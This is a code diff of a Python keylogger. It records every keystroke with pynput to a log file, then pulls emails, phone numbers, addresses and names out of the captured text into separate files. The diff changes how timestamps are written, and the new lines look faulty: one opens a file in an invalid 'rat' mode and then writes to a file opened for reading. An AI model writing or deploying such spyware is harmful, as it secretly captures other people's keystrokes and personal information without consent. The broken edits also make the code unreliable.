@@ -15,13 +15,14 @@ logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(messag
 def on_press(key):
     try:
         # Log the key pressed (character keys like a, b, 1, etc.)
-        logging.info(f"{key.char} {time}")
+        logging.info(key.char)
     except AttributeError:
         # Handle special keys like space, enter, etc.
-        logging.info(f"{key} {time}")
+        logging.info(key)
 
 def process_log():
     with open("keylog.txt", "rat") as file:
+        file.write(time)
         log_data = file.read()
 
 def get_clean_data():
@@ -46,18 +47,22 @@ def extracted_info(cleaned_data):
 
 def make_files(emails, phone_numbers, addresses, names):
     with open("emails.txt", "at") as email_file:
+        email_file.write(time)
         for email in emails:
             email_file.write(f"{email}\n")
 
     with open("phone_numbers.txt", "at") as phones_file:
+        phones_file.write(time)
         for phone_number in phone_numbers:
             phones_file.write(f"{phone_number}\n")
 
     with open("addresses.txt", "at") as addresses_file:
+        addresses_file.write(time)
         for address in addresses:
             addresses_file.write(f"{address}\n")
 
     with open("names.txt", "at") as names_file:
+        names_file.write(time)
         for name in names:
             names_file.write(f"{name}\n")
 
@@ -66,7 +71,6 @@ def start_keylogger():
     # Collect keystrokes using the pynput listener
     with pynput.keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-
 
 try:
     if __name__ == "__main__":
